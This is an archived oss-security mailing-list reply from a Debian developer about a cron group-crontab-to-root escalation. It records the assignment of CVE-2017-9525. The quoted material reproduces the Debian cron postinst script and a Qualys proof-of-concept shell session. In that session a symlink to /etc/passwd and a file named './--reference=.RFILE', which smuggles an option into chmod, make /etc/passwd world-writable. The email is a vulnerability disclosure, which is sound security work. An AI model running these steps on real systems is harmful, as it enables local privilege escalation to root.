X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3602" "Friday" "9" "June" "2017" "20:31:24" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20170609183124.x5zum2fdfegrnkzp@eldamar.local>" "88" "Re: [oss-security] Vixie/ISC Cron group crontab to root escalation" "^Date:" nil nil "6" "2017060918:31:24" "[oss-security] Vixie/ISC Cron group crontab to root escalation" (number mark "        carnil@debia Jun  9   88/3602  " thread-indent "\"Re: [oss-security] Vixie/ISC Cron group crontab to root escalation\"\n") "<20170608180534.GA27098@openwall.com>" ("<20170608180534.GA27098@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17996 invoked by uid 550); 9 Jun 2017 18:31:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 17972 invoked from network); 9 Jun 2017 18:31:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=sender:date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to:user-agent;
        bh=Mj0Tl6rw/Ng8CUEM9ZEgHKQHkFoGA7XVU9FyN1dofSU=;
        b=Mk6kTL4V3yF6QJZWVhbeu66Zcxq/hPxPJyb8+A2rFHsdIBoXbrTngSXAmWyRvZvV51
         A+fJnG6lNwz35ytcMRTbvQHKPnzrgX5E1o82D5EHQafiNJ9v4NUbCblIWEfFQIf/7SiY
         vw1+js50AVLS1jQBouT9lMk5IR+5VKaF6SJmFmBvTWSbXC1EtZjvOQyuINJL7ehjWYYH
         tVByV+ezxmBWVAL12CyCd1T/8zQmMD7xP5kijR/7gQ/OoNViCU5cUjs6y2hxxBE1B7Lw
         /CRCbHumdNSpP+vO+GISZT0dXLvzrn+yN73fLWieQr8cwvnViY2IKiRdzIB4+7JuWco4
         Jp0w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:date:from:to:subject:message-id
         :references:mime-version:content-disposition:in-reply-to:user-agent;
        bh=Mj0Tl6rw/Ng8CUEM9ZEgHKQHkFoGA7XVU9FyN1dofSU=;
        b=NKAp0QJ4Z8+7M8U4Wxvql5RpQhCBNeW849hAzAVvNDh2VKBvJTQYGyHxCCbmKVnHkC
         8dHHYU4xTI38nVZ4+LY74qb3AyRMuA8kYmE1dP4ceZTE8ioxNDyN7EZ6lCTHZFCw2r+E
         Nw8nHKJoqqyTllkfkjf1J00f0cfOdgpBn0xRMS+KpaGUZBHH0GkA5llRfolklBs0mfBF
         hvgF12DUc1vqTcFZgKK4GRhvIpTYsoMmGYSpcFasRUCHGVGfd3Og0Wg4NpvYO+b85Otl
         cJPkJ3vhhy/D1bCcKKw++Rm4oLs63v/SYHvRjjA+H75mfCDBoGkfzvToOeZii2NFJL4H
         6tVg==
X-Gm-Message-State: AKS2vOydWnR+C5NdVXefuWI4a6cs1YPRNfVUU4OOPcP/O+MUhrNQBa3+
	GgJXWi2iHv/+HflH
X-Received: by 10.28.127.10 with SMTP id a10mr941073wmd.36.1497033087107;
        Fri, 09 Jun 2017 11:31:27 -0700 (PDT)
Message-ID: <20170609183124.x5zum2fdfegrnkzp@eldamar.local>
References: <20170608180534.GA27098@openwall.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20170608180534.GA27098@openwall.com>
User-Agent: NeoMutt/20170306 (1.8.0)
Date: Fri, 9 Jun 2017 20:31:24 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
Reply-To: oss-security@lists.openwall.com
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Subject: Re: [oss-security] Vixie/ISC Cron group crontab to root escalation
To: oss-security@lists.openwall.com

Hi

On Thu, Jun 08, 2017 at 08:05:34PM +0200, Solar Designer wrote:
> In 2003, the original patch went from Owl into Debian (and thus Ubuntu),
> along with the original comment above:
> 
> https://anonscm.debian.org/cgit/pkg-cron/pkg-cron.git/commit/?id=ce8f4773590dd76505631bd71874e999a85de607
> 
> Thanks to Salvatore Bonaccorso of Debian for locating the above URL for
> the current discussion.  In there, we also see the addition of a
> postinst script changing permissions on existing crontab files.  This
> was also pointed out by Seth Arnold of Ubuntu, who wrote:
> 
> | - postinst scripts are already brittle
> | - postinst scripts themselves become a target for elevating privileges if
> |   they'll just set the permissions as needed
> | 
> | But the Debian/Ubuntu packaging already has scripts for this purpose:
> | 
> | http://sources.debian.net/src/cron/3.0pl1-128/debian/postinst/#L53
> | 
> | ...
> | # Fixup crontab , directory and files for new group 'crontab'.
> | # Can't use dpkg-statoverride for this because it doesn't cooperate nicely
> | # with cron alternatives such as bcron
> | if [ -d $crondir/crontabs ] ; then
> |     chown root:crontab $crondir/crontabs
> |     chmod 1730 $crondir/crontabs
> |     # This used to be done conditionally. For versions prior to "3.0pl1-81"
> |     # It has been disabled to suit cron alternative such as bcron.
> |     cd $crondir/crontabs
> |     set +e
> |     ls -1 | xargs -r -n 1 --replace=xxx  chown 'xxx:crontab' 'xxx'
> |     ls -1 | xargs -r -n 1 chmod 600
> |     set -e
> | fi
> 
> Qualys promptly broke this script, replying to Seth:
> 
> | Hmmm, you're right, the script itself is vulnerable to
> | group-crontab-to-root escalation of privileges:
> | 
> | root@debian:~# usermod --append --groups crontab nobody
> | root@debian:~# su --login --shell /bin/bash nobody
> | No directory, logging in with HOME=/
> | 
> | nobody@debian:/$ id
> | uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup),107(crontab)
> | 
> | nobody@debian:/$ cd /var/spool/cron/crontabs
> | 
> | # for example, this exploits the chown
> | nobody@debian:/var/spool/cron/crontabs$ ln --symbolic /etc/passwd- nobody
> | 
> | # for example, this exploits the chmod
> | nobody@debian:/var/spool/cron/crontabs$ touch ./--reference=.RFILE
> | nobody@debian:/var/spool/cron/crontabs$ chmod 0666 .RFILE > .RFILE
> | nobody@debian:/var/spool/cron/crontabs$ ln --symbolic /etc/passwd 600
> | 
> | nobody@debian:/var/spool/cron/crontabs$ ls -l /etc/passwd*
> | -rw-r--r-- 1 root root 1378 May 10 17:16 /etc/passwd
> | -rw------- 1 root root 1378 May 10 17:16 /etc/passwd-
> | 
> | # run the postinst script
> | root@debian:~# dpkg-reconfigure cron
> | chown: missing operand
> | Try 'chown --help' for more information.
> | update-rc.d: warning: start and stop actions are no longer supported; falling back to defaults
> | 
> | nobody@debian:/var/spool/cron/crontabs$ ls -l /etc/passwd*
> | -rw-rw-rw- 1    600 crontab 1378 May 10 17:16 /etc/passwd
> | -rw------- 1 nobody crontab 1378 May 10 17:16 /etc/passwd-
> | 
> | So this is a known issue?  (there may be more ways to exploit it --
> | spaces, newlines, option injections, etc).
> 
> So this looked like two issues to fix: the temporary file hard link
> attack (in OpenBSD, Debian, Ubuntu, ALT Linux, and Owl) and the postinst
> script (in Debian and Ubuntu).

For the record, the Debian and Ubuntu specific issue with the postinst
script has been assigned CVE-2017-9525.

For further discussion with the Debian cron maintainers I have as well
opened https://bugs.debian.org/864466

Regards,
Salvatore
